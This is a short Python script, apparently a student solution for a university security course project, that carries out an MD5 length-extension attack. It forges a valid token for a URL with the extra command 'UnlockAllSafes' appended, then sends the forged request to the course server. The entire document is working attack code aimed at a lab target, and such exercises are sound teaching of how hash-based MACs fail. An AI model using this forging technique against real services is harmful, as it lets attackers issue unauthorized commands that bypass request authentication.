import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd import *
url = sys.argv[1]
#url = "http://cs4440.eng.utah.edu/project1/api?token=402a574d265dc212ee64970f159575d0&user=admin&command1=ListFiles&command2=NoOp"

url_begin = url[ : url.index("token=") + 6]
url_token = url[url.index("token=") + 6 : url.index("&user=")]
url_end = url[url.index("user="): ]

m_len = 8 + len(url_end)
bits = (m_len + len(padding(m_len*8)))*8

h = md5(state=url_token, count=bits)
url_suffix = "&command3=UnlockAllSafes"
h.update(url_suffix)

new_token = h.hexdigest()
modified_url = url_begin + new_token + "&" + url_end + quote(padding(m_len*8)) + url_suffix

parsedUrl = urlparse(modified_url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())
